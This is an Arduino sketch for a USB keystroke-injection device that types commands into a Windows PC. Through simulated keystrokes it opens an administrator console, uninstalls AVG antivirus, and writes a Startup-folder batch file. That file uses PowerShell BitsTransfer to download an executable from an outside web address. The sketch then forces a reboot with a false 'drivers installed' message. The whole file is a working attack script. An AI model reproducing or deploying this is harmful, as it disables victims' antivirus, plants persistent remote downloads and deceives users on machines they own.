/*
 *  Uninstall AVG and download file after reboot
 *
 *  This example is used to:
 *    1.- Open a cmd as administrator
 *    2.- Open windows App wizard
 *    3.- Uninstall AVG antivirus
 *    4.- create a batch file at startup folder that download and execute a file from a webpage
 *
 *  http://www.github.com/joelsernamoreno/ http://www.twitter.com/JoelSernaMoreno/
 *  http://www.github.com/ernesto-xload/ http://www.twitter.com/ernesto_xload/
 *
 *  Version:    1.0
 *  Design:   Ernesto Sanchez
 *  Implementation: Joel Serna & Ernesto Sanchez
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */

#include "Keyboard.h"

#define BATCH_FILE "C:\\Users\\usuario\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\file.bat"
#define DELAY_TIME 2000

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  // Open cmd as admin
  sendkey(KEY_LEFT_GUI,0);
  delay(DELAY_TIME);
  Keyboard.print("cmd.exe");
  delay(DELAY_TIME);
  sendkey(KEY_MENU,0);
  delay(DELAY_TIME);
  sendkey(KEY_DOWN_ARROW,0);
  sendkey(KEY_DOWN_ARROW,0);
  delay(DELAY_TIME);
  sendkey(KEY_RETURN,0);
  delay(DELAY_TIME);
  sendkey(KEY_LEFT_ARROW,0);
  delay(DELAY_TIME);
  sendkey(KEY_RETURN,0);
  delay(DELAY_TIME);
  // Uninstall AVG antivirus
  // Open App Wizard from console
  Keyboard.println("appwiz.cpl");
  delay(DELAY_TIME);
  delay(DELAY_TIME);
  delay(DELAY_TIME);
  // Search for AVG and open uninstall wizard
  Keyboard.print("avg");
  sendkey(KEY_RETURN,0);
  delay(20000);
  // Select Uninstall option
  sendkey(KEY_TAB,0);
  sendkey(KEY_TAB,0);
  sendkey(KEY_TAB,0);
  sendkey(KEY_TAB,0);
  sendkey(KEY_RETURN,0);
  delay(DELAY_TIME);
  // I'm sure (Of course :D )
  sendkey(KEY_TAB,0);
  sendkey(KEY_TAB,0);
  sendkey(KEY_TAB,0);
  sendkey(KEY_TAB,0);
  sendkey(KEY_TAB,0);
  sendkey(KEY_RETURN,0);
  delay(DELAY_TIME);
  /*
  // Minimize uninstall window
  sendkey(KEY_TAB,0);
  sendkey(KEY_RETURN,0);
  delay(DELAY_TIME);
  */
  delay(60000); // Delay untill uninstall
  // Don't reboot (yet)
  sendkey(KEY_TAB,0);
  sendkey(KEY_TAB,0);
  sendkey(KEY_TAB,0);
  sendkey(KEY_RETURN,0);
  delay(DELAY_TIME); 
  // Close app wizard
  sendkey(KEY_F4,KEY_LEFT_ALT);
  // Back in console
  // Create a batch file to run at startup
  Keyboard.print("echo powershell ");
  Keyboard.print("Import-Module BitsTransfer;");
  Keyboard.print("Start-BitsTransfer -Source http://web.com/demo/demo.bin -Destination .\\fichero.exe;");
  Keyboard.print("dir .\\fichero.exe;");
  //Keyboard.print("Start-Process .\\fichero.exe;");
  Keyboard.print(" > ");
  Keyboard.println(BATCH_FILE);
  delay(DELAY_TIME);

  // Reboot windows
  Keyboard.println("shutdown /r /c \"Drivers instalados correctamente, es necesario reiniciar del sistema.\" /t 90");
  delay(100);
  Keyboard.println("exit");
  while(1);
}

void sendkey(int key, int modifiers){
  if(modifiers!=0){
    Keyboard.press(modifiers);
  }
  if(key!=0){
    Keyboard.press(key);
  }
  delay(100);
  Keyboard.releaseAll();
}

void breakpoint(void){
  while(1);
}

